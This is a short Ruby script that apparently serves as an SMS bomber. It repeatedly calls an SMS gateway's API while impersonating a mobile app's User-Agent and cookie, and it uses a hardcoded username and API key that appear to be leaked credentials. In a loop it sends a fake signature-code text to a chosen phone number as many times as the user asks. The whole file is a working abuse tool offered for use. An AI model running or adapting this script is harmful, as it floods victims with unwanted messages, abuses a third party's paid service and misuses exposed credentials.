require 'httparty'

number = "<number>"
random = 0

print "How many messages do you want to send? "
count_message = gets.chomp.to_i

while true
  url = "http://www.msegat.com/gw/?userName=darmustafa&apiKey=958e7fd9ff2e28c7e41ad30da25643ae&numbers=1#{number}&userSender=Signature&msg=Signature%20code%20is%20989328&By=Link&timeToSend=&exactTime=yyyy-MM-dd%20HH:mm:ss&msgEncoding=UTF8"
  headers = {
    'Host' => 'www.msegat.com',
    'Accept' => '*/*',
    'Cookie' => 'userLang=Ar; SERVERID=MBE1',
    'User-Agent' => 'SignatureJFApp/1 CFNetwork/1404.0.5 Darwin/22.3.0',
    'Accept-Language' => 'ar',
    'Accept-Encoding' => 'gzip, deflate',
    'Connection' => 'keep-alive'
  }

  response = HTTParty.get(url, headers: headers)

  if response.code == 200
    random += 1
    print "\r#{random} send message successfully"
    if random == count_message
      break
    end
  else
    print "\r#{random} send message unsuccessfully"
  end

  sleep 1 # Add a delay of 1 second before sending the next request
end

